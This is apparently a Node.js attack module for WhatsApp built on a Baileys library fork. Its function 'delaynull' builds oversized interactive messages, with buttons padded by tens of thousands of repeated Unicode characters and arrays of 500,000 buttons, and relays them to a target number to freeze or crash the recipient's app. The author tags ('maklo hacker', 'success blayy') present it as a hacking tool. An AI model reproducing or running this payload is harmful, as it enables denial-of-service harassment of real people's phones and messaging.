const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function delaynull(sock, target) {
    const msg = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "© X - XakaEmperorw"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑲱".repeat(30000) + "𑲱".repeat(30000),
                                    copy_code: "𑲱".repeat(50000)
                                })
                            }
                        ]
                    }
                }
            }
        }
    };
   const msg2 = {
     groupStatusMessageV2: {
         message: {
             interactiveMessage: {
                 body: {
                     text: " © X - XakaMods "
                 },
                 nativeFlowMessage: {
                     buttons: Array.from({ length: 500000 }, () => ({})),
                 }
             }
         }
     }
   };
   const msg3 = {
     interactiveMessage: {
            body: {
                text: "maklo hacker"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({
                    buttonId: "𑲱".repeat(1000),
                    buttonText: {
                        displayText: "© X" + "𑲱".repeat(1000)
                    }
                })),
                messageParamsJson: '{}'
            },
            contextInfo: {
                forwardingScore: 99999,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                    botJid: "867051314767696@bot",
                    metionedJid: "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 })
                },
                forwardOrigin: 4
            }
        }
    };
    await sock.relayMessage(target, msg);
    await sock.relayMessage(target, msg2);
    console.log("success blayy");
}

module.exports = { delaynull };